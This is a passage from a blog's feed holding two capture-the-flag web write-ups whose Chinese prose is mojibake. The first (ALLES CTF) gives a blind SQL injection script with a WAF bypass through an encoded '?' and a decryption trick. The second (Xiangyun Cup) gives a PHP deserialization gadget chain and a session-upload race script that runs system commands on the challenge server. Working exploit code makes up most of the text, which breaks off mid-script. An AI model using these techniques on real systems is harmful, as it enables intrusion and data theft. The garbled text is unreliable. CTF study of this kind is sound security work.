class="meta">@app.route(&#x27;/registerlogin&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerlogin</span>():</span></span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    pwhash = hashlib.sha256(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    user = query_db(<span class="string">&#x27;select * from users where username = ? and password = ?&#x27;</span>, </span><br><span class="line">                    [username, pwhash], one=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="comment"># new user. let&#x27;s create it in the database</span></span><br><span class="line">        new_user_uuid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">        commit_db(<span class="string">&#x27;insert into users (uuid, username, password) values (?, ?, ?)&#x27;</span>, </span><br><span class="line">                [new_user_uuid, username, pwhash])</span><br><span class="line">        user= query_db(<span class="string">&#x27;select * from users where uuid = ?&#x27;</span>, [new_user_uuid], one=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># calculate signature for cookie</span></span><br><span class="line">    key = user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    sig = signature(user[<span class="string">&#x27;uuid&#x27;</span>])</span><br><span class="line">    response = redirect(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;session&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>.<span class="subst">&#123;sig&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–é¢˜ç›®çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªflagç”¨æˆ·ï¼Œå¯†ç æœªçŸ¥ï¼Œç„¶åæ’å…¥ä¸€æ¡bodyä¸ºflagçš„notesï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905132320173.png" alt="image-20210905132320173"></p><p>ä¸è¿‡ç»è¿‡å‰é¢çš„åˆ†æï¼Œbodyå’Œtitleå­—æ®µè¿›å…¥æ•°æ®åº“çš„æ˜¯åŠ å¯†è¿‡çš„å¯†æ–‡ã€‚</p><h3 id="å„ç§å°è¯•"><a href="#å„ç§å°è¯•" class="headerlink" title="å„ç§å°è¯•"></a>å„ç§å°è¯•</h3><p>åˆ†æå®Œé¢˜ç›®é€»è¾‘åï¼Œå®¡è®¡æºç ã€‚å¾ˆæ˜æ˜¾åç«¯<code>/notes</code>å¤„orderæ˜¯å”¯ä¸€çš„æ³¨å…¥ç‚¹ï¼Œorder by åé¢å¯ä»¥ç›´æ¥ç”¨ <code>asc,(case when 1 then randomblob(5000000000000) else 1 end)</code> ï¼Œè§‚å¯Ÿæ˜¯å¦è¿”å›erroræ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p>äºæ˜¯å¼€å§‹æ³¨å…¥ï¼Œå› ä¸ºè¿‡æ»¤äº†selectï¼Œèµ·åˆæˆ‘çš„payloadæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc,(case when (substr(body,1,1)&#x3D;char(100)) then randomblob(5000000000000) else 1 end)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°æ³¨ä¸å‡ºflagçš„å¯†æ–‡ï¼Œ åªèƒ½æ³¨å‡ºæˆ‘è‡ªå·±çš„notesâ€¦ ä»”ç»†çœ‹ä¸‹sqlè¯­å¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_db(<span class="string">f&#x27;select * from notes where user = ? order by timestamp <span class="subst">&#123;order&#125;</span>&#x27;</span>, [g.user[<span class="string">&#x27;uuid&#x27;</span>]])</span><br></pre></td></tr></table></figure><p>order byåé¢å—åˆ° where çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ³¨å‡ºè‡ªå·±ç”¨æˆ·çš„å†…å®¹ã€‚</p><p>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œå°è¯•ç»•è¿‡wafï¼Œä¸è¿‡wafæœ‰ä¸ªé€’å½’çš„urldecodeï¼Œæ„Ÿè§‰ç»•ä¸è¿‡å»ã€‚ç¿»äº†néæ–‡æ¡£å¯»æ‰¾å¦‚ä½•ä¸ç”¨selectçš„æƒ…å†µä¸‹æ„é€ ä¸€ä¸ªæ–°çš„æŸ¥è¯¢é€»è¾‘ï¼Œä½†æ˜¯æ— æœï¼Œæ„Ÿè§‰è¿™æ¡è·¯æ˜¯æ— è§£çš„ã€‚</p><p>äºæ˜¯æˆ‘æƒ³åˆ°äº†è¯»æ–‡ä»¶ï¼Œè¦æ˜¯èƒ½è¯»æ–‡ä»¶ç›´æ¥è¯»å– /tmp/secretï¼Œå†æŠŠ sqlite.db ç»™æ‹–ä¸‹æ¥ï¼Œå¯ä»¥ç›´æ¥ä¼ªé€  flag ç”¨æˆ·ã€‚</p><p>æœ¬åœ°èµ·ä¸ªç¯å¢ƒï¼Œè¯•è¯•ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/unknown.png" alt="img"></p><p>çœ‹èµ·æ¥å¯ä»¥ï¼æ³¨å…¥è¯•ä¸€ä¸‹ï¼Œå¥½åƒ8å¤ªè¡Œï¼Œçœ‹ä¸‹logï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/unknown-20210905133020008.png" alt="img"></p><p>æ²¡äº‹äº†ï¼Œpython sqlite3 çœ‹èµ·æ¥ä¸æ”¯æŒ readfileâ€¦</p><h3 id="æŸ³æš—èŠ±æ˜"><a href="#æŸ³æš—èŠ±æ˜" class="headerlink" title="æŸ³æš—èŠ±æ˜"></a>æŸ³æš—èŠ±æ˜</h3><p>ç»é˜Ÿé‡Œå¸ˆå‚…çš„å°è¯•ï¼Œç«Ÿç„¶èƒ½ç»•è¿‡WAFä½¿ç”¨selectï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;notes%3Forder&#x3D;xxx</span><br></pre></td></tr></table></figure><p>å›è¿‡å¤´çœ‹ä¸‹æºç ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905133345571.png" alt="image-20210905133345571"></p><p>waf æ˜¯é€šè¿‡ request.argså–çš„ï¼Œè€ŒæŠŠ?è¿›è¡Œurlencodeï¼Œåé¢çš„æ•°æ®éƒ½è¢«å½“æˆäº†pathï¼Œè‡ªç„¶å¯ä»¥é€šè¿‡wafã€‚è€Œè¯·æ±‚åç«¯çš„æ—¶å€™ï¼Œpathä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecodeæ‹¼æ¥åˆ°urlåé¢ï¼Œ%3Få˜æˆäº†?ï¼Œåç«¯å°±å¯ä»¥æ­£å¸¸è·å–åˆ°orderå‚æ•°äº†ã€‚ä¸è¿‡æ³¨æ„åé¢è¿˜å¤šä¸€ä¸ª?ï¼Œåœ¨æˆ‘ä»¬æ³¨å…¥çš„æ—¶å€™payloadåé¢è¦åŠ ä¸ªæ³¨é‡Šï¼ŒæŠŠè¿™ä¸ªé—®å·æ³¨é‡Šæ‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>æ˜¯æˆ‘èœäº†â€¦ å­¦åˆ°äº†ã€‚</p><p>ç»•è¿‡waf ï¼Œé‚£å°±å¥½åŠäº†ï¼Œå­—ç¬¦ä¸²ä¹Ÿä¸éœ€è¦ç”¨CHARæ‹¼æ¥äº†ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc,(case when (select substr(body,%s,1)&#x3D;&quot;%s&quot; from notes where user!&#x3D;&#123;userid&#125;) then randomblob(5000000000000) else 1 end)--</span><br></pre></td></tr></table></figure><p>æ³¨å…¥å‡ºflagçš„å¯†æ–‡ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œè§£å¯†ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°åˆ é™¤noteå¤„æœ‰ä¸€å¤„å¾ˆå¯ç–‘ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905134422923.png" alt="image-20210905134422923"></p><p>/notesè·¯ç”±æ ¹æœ¬å°±æ²¡æœ‰å¤„ç† deleted å‚æ•°çš„é€»è¾‘ï¼Œå¹¶ä¸”è¿™é‡Œçš„note_uuidæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚redirectå‡½æ•°ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905134537799.png" alt="image-20210905134537799"></p><p>å¯ä»¥çœ‹åˆ°è¿”å›çš„å†…å®¹é‡ŒåŒ…å«locationï¼Œæ‰€ä»¥/delete_noteè·¯ç”±çš„uuidå‚æ•°å°±æ˜¯ä¸€ä¸ªç”¨äºè§£å¯†çš„åŠŸèƒ½ï¼ŒæŠŠå¯†æ–‡é€šè¿‡uuidå‚æ•°å‘è¿‡å»å°±å¯ä»¥äº†ã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># url = &quot;https://7b0000006f329cb3e773932f-amazing-crypto-waf.challenge.master.allesctf.net:31337/&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&#x27;gmlsec&#x27;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;gmlsec&#x27;</span>&#125;</span><br><span class="line">    resp = s.post(url + <span class="string">&#x27;/registerlogin&#x27;</span>, data=paramsPost, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;gmlsec&#x27;</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;gml&quot;</span>, <span class="string">&quot;body&quot;</span>: <span class="string">&quot;gml&quot;</span>&#125;</span><br><span class="line">    response = s.post(url + <span class="string">&quot;/add_note&quot;</span>, data=paramsPost, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_notes</span>(<span class="params">order</span>):</span></span><br><span class="line">    response = s.get(url + <span class="string">&quot;/notes%3Forder=&quot;</span> + order, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_flag</span>():</span></span><br><span class="line">    userid = s.cookies.get_dict()[<span class="string">&#x27;session&#x27;</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># my user&#x27;s uuid</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    tem = <span class="string">&#x27;desc,(case when (select substr(body,%s,1)=&quot;%s&quot; from notes where user!=&quot;&#123;userid&#125;&quot;) then randomblob(5000000000000) else 1 end)--&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        userid=userid)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&quot;/=:&quot;</span>:</span><br><span class="line">            payload = tem % (i,c)</span><br><span class="line">            <span class="keyword">if</span> get_notes(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;end!&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;uuid&quot;</span>: cipher&#125;</span><br><span class="line">    response = s.post(url + <span class="string">&quot;/delete_note&quot;</span>, data=paramsPost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span> response.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    data = get_encrypted_flag()</span><br><span class="line">    dec(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿œç¨‹ç¯å¢ƒäº¤äº’éå¸¸æ…¢ï¼ˆè¿˜æ˜¯httpsï¼‰ï¼Œæœ¬åœ°è·‘æ˜¯å®Œå…¨æ²¡æœ‰é—®é¢˜çš„ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™å‘¨æœ«æœ¬æ¥åœ¨èµ¶æŠ¥å‘Šddlï¼Œå†™æŠ¥å‘Šå†™ç´¯äº†å‡†å¤‡å»çœ‹çœ‹é¢˜ä¼‘æ¯ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°ä¸€é“é¢˜çœ‹äº†å…­ä¸ƒä¸ªå°æ—¶å¡ä½ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´.. è®°å½•ä¸‹è¿™é“é¢˜ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/Web/wp/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
    <category term="urlç¼–ç ç»•è¿‡" scheme="https://igml.top/tags/url%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>2021 ç¥¥äº‘æ¯wp</title>
    <link href="https://igml.top/2021/08/22/2021-xiangyuncup/"/>
    <id>https://igml.top/2021/08/22/2021-xiangyuncup/</id>
    <published>2021-08-22T12:10:30.000Z</published>
    <updated>2021-08-22T12:48:21.098Z</updated>
    
    <content type="html"><![CDATA[<p>2021 ç¥¥äº‘æ¯åˆèµ› Web é¢˜è§£ã€‚</p><a id="more"></a><h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/9948#toc-6">https://xz.aliyun.com/t/9948#toc-6</a> ç¬¬å››æ¡é“¾å­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $output;</span><br><span class="line">        <span class="keyword">private</span> $processes = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> RunProcess())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $streams = [];</span><br><span class="line">        <span class="keyword">private</span> $seekable = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $remoteStream;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $source;</span><br><span class="line">        <span class="keyword">private</span> $size=<span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> $buffer;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            $a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag.txt&#x27;</span>);&#125;;</span><br><span class="line">            $a = \Opis\<span class="built_in">Closure</span>\serialize($a);</span><br><span class="line">            $b = unserialize($a);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=$b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h2><p>ä¸€ä¸ªssrfï¼Œç»è¿‡æµ‹è¯•æ˜¯ file_get_contents.</p><p>æ‰«ç›®å½•ï¼Œ/adminæ˜¯403ï¼Œssrfå»è¯·æ±‚<a href="http://127.0.0.1/admin">http://127.0.0.1/admin</a>ã€‚</p><p>é‡Œé¢ä¸€ä¸ªphpï¼Œæ–‡ä»¶åŒ…å«è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œè€ƒè™‘sessionç«äº‰ä¸Šä¼ +æ–‡ä»¶åŒ…å«ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zefzyj8kapji8067alv.cloudeci1.ichunqiu.com/&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">rawBody = json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;gmla&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>&#125;)</span><br><span class="line">headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zef0qsx7zblq9rh24yv.cloudeci1.ichunqiu.com//login.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">response = session.post(url + <span class="string">&#x27;/login.php&#x27;</span>, data=rawBody, headers=headers, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span>(<span class="params">i</span>):</span></span><br><span class="line">    proxies = &#123;&#125;</span><br><span class="line">    <span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&#x27;gml666&lt;?php system(&quot;/getflag.sh&quot;);?&gt;&#x27;</span>&#125;</span><br><span class="line">    paramsMultipart = [(<span class="string">&#x27;f&#x27;</span>, (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">40000</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;444&quot;</span>&#125;</span><br><span class="line">    response = requests.post(url, data=paramsPost, files=paramsMultipart, cookies=cookies, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span>(<span class="params">i</span>):</span></span><br><span class="line">    filename = <span class="string">&#x27;/tmp/sess_444&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        session.post(url + <span class="string">&quot;/check2.php&quot;</span>, data=&#123;<span class="string">&#x27;url1&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:80/admin/include123.php?u=&#x27;</span> + filename&#125;,</span><br><span class="line">                     proxies=proxies)</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;/preview.php&#x27;</span>, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;gml666&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;success!&quot;</span></span><br><span class="line">     